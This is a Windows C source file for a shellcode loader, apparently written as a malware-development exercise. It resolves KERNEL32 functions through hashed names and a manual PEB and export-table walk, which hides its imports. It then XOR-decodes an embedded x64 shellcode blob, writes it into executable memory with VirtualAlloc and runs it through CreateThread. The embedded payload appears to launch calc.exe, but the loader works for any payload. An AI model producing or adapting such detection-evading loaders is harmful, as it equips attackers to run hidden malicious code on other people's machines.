#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

#define error(FUNCTIONNAME) printf("[-] %s Failed With Error : %d\n", #FUNCTIONNAME, GetLastError()) // function error
#define log(LOGTEXT) printf("[+] %s\n", #LOGTEXT)
#define generror(ERRTEXT) printf("[-] %s\n", #ERRTEXT) // general error

// taken from https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
typedef HANDLE(WINAPI* fnCreateThread) (
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	LPVOID					lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
);

// taken from https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
typedef LPVOID(WINAPI* fnVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
);

SIZE_T StringLengthA(_In_ LPCSTR String) {
	LPCSTR String2;
	for (String2 = String; *String2; ++String2);
	return (String2 - String);
}

SIZE_T StringLengthW(_In_ LPCWSTR String) {
	LPCWSTR String2;
	for (String2 = String; *String2; ++String2);
	return (String2 - String);
}

// wide char hash
INT32 HashStringMurmurW(_In_ LPCWSTR String)
{
	INT  Length = (INT)StringLengthW(String);
	UINT32 hash = 0;
	PUINT32 Tmp;
	SIZE_T  Idx;
	UINT32  Cnt;

	if (Length > 3)	{
		Idx = Length >> 2;
		Tmp = (PUINT32)String;
		do {
			Cnt = *Tmp++;

			Cnt *= 0xcc9e2d51;
			Cnt = (Cnt << 15) | (Cnt >> 17);
			Cnt *= 0x1b873593;

			hash ^= Cnt;
			hash = (hash << 13) | (hash >> 19);
			hash = (hash * 5) + 0xe6546b64;
		} while (--Idx);

		String = (PWCHAR)Tmp;
	}
	if (Length & 3) {
		Idx = Length & 3;
		Cnt = 0;
		String = &String[Idx - 1];
		do {
			Cnt <<= 8;
			Cnt |= *String--;
		} while (--Idx);

		Cnt *= 0xcc9e2d51;
		Cnt = (Cnt << 15) | (Cnt >> 17);
		Cnt *= 0x1b873593;
		hash ^= Cnt;
	}

	hash ^= Length;
	hash ^= hash >> 16;
	hash *= 0x85ebca6b;
	hash ^= hash >> 13;
	hash *= 0xc2b2ae35;
	hash ^= hash >> 16;

	return hash;
}

// ascii char hash
INT32 HashStringMurmurA(_In_ LPCSTR String)
{
	INT  Length = (INT)StringLengthA(String);
	UINT32 hash = 0;
	PUINT32 Tmp;
	SIZE_T  Idx;
	UINT32  Cnt;

	if (Length > 3)	{
		Idx = Length >> 2;
		Tmp = (PUINT32)String;
		do {
			Cnt = *Tmp++;

			Cnt *= 0xcc9e2d51;
			Cnt = (Cnt << 15) | (Cnt >> 17);
			Cnt *= 0x1b873593;

			hash ^= Cnt;
			hash = (hash << 13) | (hash >> 19);
			hash = (hash * 5) + 0xe6546b64;
		} while (--Idx);

		String = (PCHAR)Tmp;
	}

	if (Length & 3)	{
		Idx = Length & 3;
		Cnt = 0;
		String = &String[Idx - 1];

		do {
			Cnt <<= 8;
			Cnt |= *String--;
		} while (--Idx);

		Cnt *= 0xcc9e2d51;
		Cnt = (Cnt << 15) | (Cnt >> 17);
		Cnt *= 0x1b873593;
		hash ^= Cnt;
	}

	hash ^= Length;
	hash ^= hash >> 16;
	hash *= 0x85ebca6b;
	hash ^= hash >> 13;
	hash *= 0xc2b2ae35;
	hash ^= hash >> 16;

	return hash;
}

HMODULE GetModuleHandleHash(DWORD dwModuleHash) {
	if (dwModuleHash == 0) return NULL;
	// 1. retrieve pointer to PEB struct
	// 64-bit
	PPEB pPeb = (PEB*)(__readgsqword(0x60));

	// 32-bit
	// PPEB	pPeb = (PEB*)(__readfsdword(0x30));

	// 2. Retrieve the Ldr member from PEB, which contains the loaded DLLs. Then retrieve the linked list of loaded modules
	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	// 3. Iterate through the entire list, checking for the DLL we want via hashing and comparison.
	while (pDte) {
		if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {
			CHAR Upper[MAX_PATH];
			DWORD i = 0;
			for (i = 0; pDte->FullDllName.Buffer[i] != '\0'; i++) {
				Upper[i] = toupper(pDte->FullDllName.Buffer[i]);
			}
			Upper[i] = '\0';

			if (HashStringMurmurA(Upper) == dwModuleHash) {
				return pDte->Reserved2[0];
			}
		}
		else {
			break;
		}
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}
	return NULL;
}

FARPROC GetProcAddressHash(HMODULE hModule, DWORD dwFuncHash) {
	if (hModule == NULL || dwFuncHash == 0) return NULL;

	// using base address of hModule, find function via hashing (signature checks omitted)
	// 1. Get DOS Header, then NT headers, then optional header, then image export table
	PBYTE pBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)pBase;
	PIMAGE_NT_HEADERS	pImgNt = (PIMAGE_NT_HEADERS)(pBase + pImgDos->e_lfanew);
	IMAGE_OPTIONAL_HEADER ImgOpt = pImgNt->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY pImgExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOpt.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// 2. Get the names, address and ordinals of the functions 
	// note that ALL OF THESE ARE RVAs!!
	PDWORD pAddr = (PDWORD)((DWORD_PTR)pBase + pImgExport->AddressOfFunctions);
	PDWORD pNames = (PDWORD)((DWORD_PTR)pBase + pImgExport->AddressOfNames);
	PWORD pOrdinals = (PWORD)((DWORD_PTR)pBase + pImgExport->AddressOfNameOrdinals);

	// 3. Iterate through each function name within the export table and return the correct one.
	for (DWORD i = 0; i < pImgExport->NumberOfFunctions; i++) {
		CHAR* pFuncName = (CHAR*)(pBase + pNames[i]);
		PVOID pFuncAddr = (PVOID)(pBase + pAddr[pOrdinals[i]]);
		if (dwFuncHash == HashStringMurmurA(pFuncName)) {
			return pFuncAddr;
		}
	}
	return NULL;
}

unsigned char pPayload[] =
"\x85\x31\xfa\x9d\x89\x91\xb9\x79\x79\x79\x38\x28\x38\x29\x2b\x28\x2f\x31\x48\xab\x1c\x31\xf2\x2b\x19\x31\xf2\x2b\x61\x31\xf2\x2b\x59\x31\xf2\x0b\x29\x31\x76\xce\x33\x33\x34\x48\xb0\x31\x48\xb9\xd5\x45\x18\x05\x7b\x55\x59\x38\xb8\xb0\x74\x38\x78\xb8\x9b\x94\x2b\x38\x28\x31\xf2\x2b\x59\xf2\x3b\x45\x31\x78\xa9\xf2\xf9\xf1\x79\x79\x79\x31\xfc\xb9\x0d\x1e\x31\x78\xa9\x29\xf2\x31\x61\x3d\xf2\x39\x59\x30\x78\xa9\x9a\x2f\x31\x86\xb0\x38\xf2\x4d\xf1\x31\x78\xaf\x34\x48\xb0\x31\x48\xb9\xd5\x38\xb8\xb0\x74\x38\x78\xb8\x41\x99\x0c\x88\x35\x7a\x35\x5d\x71\x3c\x40\xa8\x0c\xa1\x21\x3d\xf2\x39\x5d\x30\x78\xa9\x1f\x38\xf2\x75\x31\x3d\xf2\x39\x65\x30\x78\xa9\x38\xf2\x7d\xf1\x31\x78\xa9\x38\x21\x38\x21\x27\x20\x23\x38\x21\x38\x20\x38\x23\x31\xfa\x95\x59\x38\x2b\x86\x99\x21\x38\x20\x23\x31\xf2\x6b\x90\x2e\x86\x86\x86\x24\x31\xc3\x78\x79\x79\x79\x79\x79\x79\x79\x31\xf4\xf4\x78\x78\x79\x79\x38\xc3\x48\xf2\x16\xfe\x86\xac\xc2\x89\xcc\xdb\x2f\x38\xc3\xdf\xec\xc4\xe4\x86\xac\x31\xfa\xbd\x51\x45\x7f\x05\x73\xf9\x82\x99\x0c\x7c\xc2\x3e\x6a\x0b\x16\x13\x79\x20\x38\xf0\xa3\x86\xac\x1a\x18\x15\x1a\x57\x1c\x01\x1c\x79\x79";

#define DLLHASH 0xA5070186 // KERNEL32.DLL
#define THREADHASH 0xF0A87940 // CreateThread
#define VIRTUALHASH 0xC17E7EBD // VirtualAlloc

int main() {
	// printf("[i] Hash of KERNEL32.DLL is : 0x%0.8X \n", HashStringMurmurA("KERNEL32.DLL"));
	// printf("[i] Hash of CreateThread is : 0x%0.8X \n", HashStringMurmurA("CreateThread"));
	// printf("[i] Hash of CreateThread is : 0x%0.8X \n", HashStringMurmurA("VirtualAlloc"));

	// load Kernel32 via hash
	if (!LoadLibraryA("KERNEL32.DLL")) {
		error(LoadLibraryA);
		return -1;
	}
	log(Loaded library);

	HMODULE hKernel32 = GetModuleHandleHash(DLLHASH);
	if (!hKernel32) {
		generror(Failed to get library handle);
		return -1;
	}
	log(Got handle to library);

	fnCreateThread pCreateThread = (fnCreateThread)GetProcAddressHash(hKernel32, THREADHASH);
	if (!pCreateThread) {
		generror(Failed to get CreateThread);
		return -1;
	}
	log(Found CreateThread address);

	fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddressHash(hKernel32, VIRTUALHASH);
	if (pVirtualAlloc == NULL) {
		generror(Failed to get VirtualAlloc);
		return -1;
	}
	log(Found VirtualAlloc address);

	SIZE_T sPayloadSize = sizeof(pPayload);
	char key = 'key';
	int i = 0;
	for (i; i < sPayloadSize; i++) {
		pPayload[i] = pPayload[i] ^ key;
	}
	log(Decrypted shellcode);

	PVOID pShellcode = pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pShellcode) {
		error(VirtualAlloc);
		return -1;
	}
	log(Allocated space for payload);

	memcpy(pShellcode, pPayload, sPayloadSize);
	log(Copied payload);

	DWORD tid = 0;
	HANDLE hThread = pCreateThread(NULL, NULL, pShellcode, NULL, NULL, &tid);
	printf("[+] Thread created with TID: %d\n", tid);
	if (!hThread) {
		error(CreateThread);
		return -1;
	}
	WaitForSingleObject(hThread, INFINITE);
	return 1;
}